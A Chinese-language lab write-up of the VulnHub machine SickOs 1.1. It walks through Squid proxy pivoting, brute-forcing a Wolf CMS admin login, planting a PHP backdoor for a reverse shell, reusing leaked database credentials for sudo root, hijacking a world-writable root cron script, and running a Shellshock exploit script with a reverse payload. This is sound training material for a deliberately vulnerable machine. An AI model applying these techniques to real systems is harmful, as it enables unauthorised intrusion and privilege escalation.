# SickOs: 1.1

https://www.vulnhub.com/entry/sickos-11,132/

difficulty: not know

Finish Date：2024-4-16

## IP

192.168.10.164

## Scan

Open Port -> 22,3128,8080

```
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 093d29a0da4814c165141e6a6c370409 (DSA)
|   2048 8463e9a88e993348dbf6d581abf208ec (RSA)
|_  256 51f6eb09f6b3e691ae36370cc8ee3427 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
```

跟上一个靶场类似，我们看到有 squid，联想到了利用 squid 代理进行访问，还可能有没扫出来的开放端口。使用 msf 中的 scanner/http/squid_pivot_scanning 进行端口开放探测，发现了 22 和 80 开放。

```
[+] [192.168.10.164] 192.168.10.164:22 seems open (HTTP 200, server header: 'squid/3.1.19').
[+] [192.168.10.164] 192.168.10.164:80 seems open (HTTP 200, server header: 'Apache/2.2.22 (Ubuntu)').
```

使用 curl --proxy http://192.168.10.164:3128 http://192.168.10.164 返回内容如下：

```
BLEHHH!!!
```

使用目录扫描工具对 http://192.168.10.164/ 进行扫描，发现 /robots.txt

```
User-agent: *
Disallow: /
Dissalow: /wolfcms
```

扫描 http://192.168.10.164/wolfcms ，看到 CMS 的名字是：Wolf CMS，找到了 cms 的登陆页面：http://192.168.10.164/wolfcms/?/admin/login，但是没有用户名和密码，在网上搜索后，找到此cms的默认用户名是admin，默认密码为：123333b81bK，尝试登陆，但是不对，尝试用密码爆破，结果得到了admin对应的密码为admin。

在文章编辑页面 http://192.168.10.164/wolfcms/?/admin/page/edit/5 写入我们的 php 后门代码保存，然后在 kali 上进行监听，访问文章页面 http://192.168.10.164/wolfcms/，得到反弹的 shell 连接，进行后续操作。

先升级下 tty：python -c 'import pty; pty.spawn("/bin/bash")'

查看到 wolfcms 中的 mysql 数据连接配置文件 /var/www/wolfcms/config.php 内容为：

```
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');
```

进入数据库，看看有没有什么用户名和密码之类的信息。 mysql -u root -p ，发现 user 表中也只有之前我们发现的 admin 用户。

## flag

### 方式 1：

在/home 目录发现了用户：sickos，但是没找到用户的 ssh 密码，尝试用上面找到的数据库密码进行用户切换，果然 sickos 的系统密码为 john@123。切换到该用户后，sudo -l 发现有全部命令的执行权限，所以直接查看 flag 文件，得到内容：

```
sickos@SickOs:~$ sudo cat /root/a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```

### 方式 2：

查找是否有 cron 任务，/etc/crontab 中无自定义计划任务，在 /etc/cron.d 中发现重要信息：

```
ickos@SickOs:/etc/cron.d$ cat automate

* * * * * root /usr/bin/python /var/www/connect.py
```

这个脚本是以 root 权限每分钟执行一次，查看脚本看是否有可写权限，发现是 777 权限：

```
sickos@SickOs:/etc/cron.d$ ls -al /var/www/connect.py
-rwxrwxrwx 1 root root 109 Dec  5  2015 /var/www/connect.py
```

所以可以直接把 python 的反弹连接代码，写入到这个脚本中，kali 上进行监听，等待计划任务执行，就能得到反弹的 root 权限的 shell 连接。

另外使用 nikto 对网站进行扫描：

```
nikto -h http://192.168.10.164 -useproxy http://192.168.10.164:3128
```

发现了如下漏洞信息，表示存在 shellshock 漏洞：

```
/cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
```

使用下面利用脚本进行利用：

```
searchsploit -m 34900
python2 34900.py payload=reverse rhost=192.168.10.164 lhost=192.168.10.3 lport=7777 proxy=192.168.10.164:3128 pages=/cgi-bin/status/
```

看到 /cgi-bin/status 的执行代码：

```
cat /usr/lib/cgi-bin/status

#!/bin/bash

echo "Content-Type: application/json";
echo ""
echo '{ "uptime": "'`uptime`'", "kernel": "'`uname -a`'"} '
```

最终也获得了系统的 www-data 的 shell 执行权限。
